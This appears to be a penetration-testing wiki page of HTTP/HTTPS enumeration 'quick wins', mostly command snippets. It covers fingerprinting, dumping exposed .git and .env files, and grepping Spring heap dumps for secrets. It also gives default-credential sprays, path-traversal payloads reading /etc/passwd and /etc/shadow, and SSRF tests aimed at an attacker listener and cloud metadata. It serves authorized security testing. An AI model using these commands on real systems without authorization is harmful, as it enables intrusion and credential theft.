---
service: http
title: HTTP / HTTPS
ports: 80, 443, 8080, 8443, 8000, 8888
aliases: web, https, http-alt
---

# HTTP / HTTPS — quick wins

**When you see it:** any open web port — the interest level is determined by what's running
on it. Fingerprint tech stack first, then pivot to the relevant specialist page (Tomcat →
AJP/JMX, Spring → actuator, GraphQL API → `gql.py`). This page covers the "first 15
minutes" before going deeper.

> Authorized testing only. Triage is read-only; steps marked ✏️ interact with the
> application beyond passive observation — confirm scope before running them.

## Triage (read-only)
```sh
# Banner + tech fingerprint
curl -sI http://H/                          # Server header, cookies, X-Powered-By
whatweb -a 3 http://H/                      # Aggressive fingerprint (CMS, framework, version)
httpx -u http://H/ -title -tech-detect -status-code -favicon

# Quick vuln surface sweep
nuclei -u http://H/ -as                     # auto-select templates based on fingerprinted tech
nikto -h http://H/                          # classic misconfig sweep

# Common exposed endpoints — check all 200 / 30x responses
curl -sI http://H/.git/HEAD                 # exposed git repo
curl -sI http://H/.env                      # environment file (creds, API keys)
curl -sI http://H/backup.zip http://H/backup.tar.gz http://H/www.zip
curl -sI http://H/actuator/env http://H/actuator/heapdump http://H/actuator/mappings
curl -sI http://H/swagger-ui.html http://H/swagger-ui/ http://H/api-docs http://H/openapi.json

# Virtual-host discovery
ffuf -u http://H/ -H "Host: FUZZ.H" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403
```

## Quick wins

### Tech fingerprint → CVE pivot
```sh
whatweb -a 3 http://H/ | grep -Ei "version|cms|framework"
# If Tomcat detected → see wiki/ajp.md and wiki/jmx.md
# If Spring Boot detected → check actuator (below)
# If WordPress/Drupal/Joomla detected → use nuclei CMS templates
nuclei -u http://H/ -tags cms,exposure,misconfig
```
*Why:* Identifying the exact framework + version in the first pass lets you pivot directly
to known CVEs instead of generic brute-force; nuclei's auto-template selection does this
in seconds.

### Exposed `.git` → full source dump
```sh
curl -s http://H/.git/HEAD | grep -q "ref:" && echo "GIT EXPOSED"
# Dump and reconstruct with git-dumper:
git-dumper http://H/.git ./repo-dump
# Or: GitTools/Dumper/gitdumper.sh http://H/.git/ ./repo-dump
```
*Why:* an exposed `.git` directory yields full application source, commit history, and
frequently hard-coded creds, API keys, and internal hostnames.

### Exposed `.env` / config files
```sh
for f in .env .env.local .env.production config.php settings.py wp-config.php; do
    curl -s "http://H/$f" | grep -Ei "password|secret|key|token|db_" && echo "HIT: $f"
done
```
*Why:* CI/CD pipelines and developer error routinely leave these files web-accessible;
one hit typically yields DB creds, API keys, or cloud provider tokens.

### Spring Actuator exposure
```sh
for ep in env heapdump beans mappings trace logfile; do
    code=$(curl -so /dev/null -w "%{http_code}" http://H/actuator/$ep)
    echo "$code  /actuator/$ep"
done
# Grab the heap dump (contains live secrets in memory):
curl -s http://H/actuator/heapdump -o heap.hprof
strings heap.hprof | grep -Ei "password|secret|token|Bearer"
```
*Why:* `/actuator/heapdump` on an unauthenticated Spring Boot app leaks live JVM heap —
frequently contains DB passwords, JWT signing keys, and OAuth tokens in plaintext.

### Swagger / OpenAPI endpoint enumeration ✏️
```sh
# Discovery
curl -sI http://H/swagger-ui.html http://H/swagger-ui/ http://H/v2/api-docs http://H/openapi.json
# Enumerate all listed routes and test for missing auth:
docker run --rm -it securecodebox/zap-api-scan -t http://H/openapi.json -f openapi
# Or use the repo GraphQL helper if the API is GraphQL:
# python3 standalones/graphql/gql.py --url http://H/graphql --introspect
```
*Why:* exposed API specs list every endpoint and parameter; unauthenticated Swagger UIs
let you test all endpoints directly in-browser and often bypass auth on internal routes.

### Default credentials on admin panels ✏️
```sh
# Common panel paths — check for 200/302:
for path in /manager/html /admin /jenkins /wp-admin /phpmyadmin /console /web/index.html; do
    echo "$(curl -so /dev/null -w "%{http_code}" http://H$path)  $path"
done
# Credential sweep with repo helper:
python3 standalones/creds/default-creds-sweep.py --url http://H/manager/html --service tomcat
```
*Why:* Tomcat manager (`tomcat:tomcat`, `admin:admin`), Jenkins (anonymous enabled or
`admin:admin`), and PHPMyAdmin (`root:` blank) are the most common first-blood paths.

### Directory brute-force
```sh
ffuf -u http://H/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -mc 200,301,302,403 -t 40 -o ffuf-dirs.json
gobuster dir -u http://H/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -x php,html,txt,bak -o gobuster.txt
```
*Why:* reveals backup files, staging paths, and admin areas missed by passive scanning.

### LFI quick test ✏️
```sh
# Try common LFI parameters if the app takes a filename/path param:
curl "http://H/index.php?page=../../../../etc/passwd"
curl "http://H/download?file=../../../../etc/passwd"
curl "http://H/view?doc=../../../../etc/shadow"
```
*Why:* misconfigured `include()` or file-serving endpoints on PHP/Java apps frequently
expose arbitrary file read — `/etc/passwd` confirms the primitive.

### SSRF quick test ✏️
```sh
# Point the app at your listener (use Burp Collaborator or interactsh):
curl "http://H/fetch?url=http://ATT:4444/ssrf-test"
curl "http://H/proxy?target=http://169.254.169.254/latest/meta-data/"  # AWS IMDSv1
# Listen: nc -lnvp 4444
```
*Why:* SSRF against cloud metadata endpoints (169.254.169.254 / fd00:ec2::254) leaks IAM
credentials; internal SSRF reaches services not exposed externally.

## aranum helpers
- `aranumtoolkit/network/enum-http.sh` — the dispatcher that fingerprints and produces
  this finding (also spawns `enum-https.sh` for TLS targets).
- `standalones/graphql/gql.py` — use for GraphQL endpoints discovered during HTTP enum
  (`--introspect`, `--dump`, `--query`).
- `standalones/creds/default-creds-sweep.py` — credential spray against discovered panels.
- `standalones/creds/default-creds.json` — credential list for the sweep.

## Gotchas
- WAFs/rate-limiting: slow down (`-rate` / `--delay`) or reduce parallelism; nikto is
  loud and will get blocked fast on protected targets.
- HTTPS with self-signed certs: add `-k` / `--insecure` to curl; `httpx -insecure`;
  `nuclei -ni`; `gobuster -k`.
- Virtual-hosting: if the IP serves a default vhost with no content, `whatweb` and nuclei
  will fingerprint the wrong app — always resolve the hostname and pass it via `-H Host:`.
- Spring Boot 2.x+ restricts actuator exposure by default; `/actuator` still returns a
  list of *enabled* endpoints — read it before probing.
- `.env` / `.git` may return 403 (directory listing disabled) but individual files may
  still be readable — try `/.git/config`, `/.git/COMMIT_EDITMSG` explicitly.
- For service-specific deep dives: Tomcat → `wiki/ajp.md`; JMX → `wiki/jmx.md`;
  Docker API → `wiki/docker.md`; Kubernetes → `wiki/kubernetes.md`.

## Sources
- HackTricks `80,443-pentesting-web`; HackTricks Spring Actuators; PayloadsAllTheThings
  Network Discovery; Hackviser HTTP; OWASP WSTG `04-Authentication_Testing/02-Default-Credentials`.
